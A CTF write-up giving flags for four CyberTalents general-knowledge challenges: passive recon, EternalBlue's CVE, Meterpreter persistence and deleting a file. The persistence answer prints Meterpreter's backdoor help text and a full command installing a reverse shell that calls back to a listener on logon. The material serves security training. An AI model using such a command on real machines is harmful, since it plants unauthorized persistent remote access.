
## Challenge Name: Silent Look

#### [Challenge Link](https://cybertalents.com/challenges/general-information/silent-look)
#### Challenge Description: athering as much information as possible without establishing contact between the pen tester and the target which you are collecting information.

Flag Format: XXXXXXX XXXXXXXXXXX XXXXXXXXX

#### Flag : Passive Information Gathering


## Challenge Name:  CVE Number 

#### [Challenge Link](https://cybertalents.com/challenges/general-information/cve-number)
#### Challenge Description : What is the CVE ID that is related to EternalBlue

Just look into WikiPedia Page https://en.wikipedia.org/wiki/EternalBlue

Flag Format: XXX-XXXX-XXXX
#### Flag : CVE-2017-0144

## Challenge Name:  Persistence

#### [Challenge Link](https://cybertalents.com/challenges/general-information/persistence)
#### Challenge Description

You want to achieve persistence using Meterpreter’s persistence module by creating an autorun registry file and getting a shell automatically every time the user restarts the PC

Persistence options 

    Your local host IP: 192.168.0.177
    Your Local port: 1337
    Minutes after restarting the system: 7 

Flag format is the full command used in MSF

If you look into the meterpeters help
```

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
Meterpreter Script for creating a persistent backdoor on a target host.

OPTIONS:

    -A        Automatically start a matching exploit/multi/handler to connect to the agent
    -L   Location in target host to write payload to, if none %TEMP% will be used.
    -P   Payload to use, default is windows/meterpreter/reverse_tcp.
    -S        Automatically start the agent on boot as a service (with SYSTEM privileges)
    -T   Alternate executable template to use
    -U        Automatically start the agent when the User logs on
    -X        Automatically start the agent when the system boots
    -h        This help menu
    -i   The interval in seconds between each connection attempt
    -p   The port on which the system running Metasploit is listening
    -r   The IP of the system running Metasploit listening for the connect back
 ```

#### Flag : run persistence -U -i 7 -p 1337 -r 192.168.0.177


## Challenge Name: remove

#### [Challenge Link](https://cybertalents.com/challenges/general-information/remove)
#### Challenge Description I need to remove a file called secret in my home directory. which command should i use you 
User's home directory /home/USERNAME/ or ~/ for short, contains user's files
#### Flag : rm ~/secret
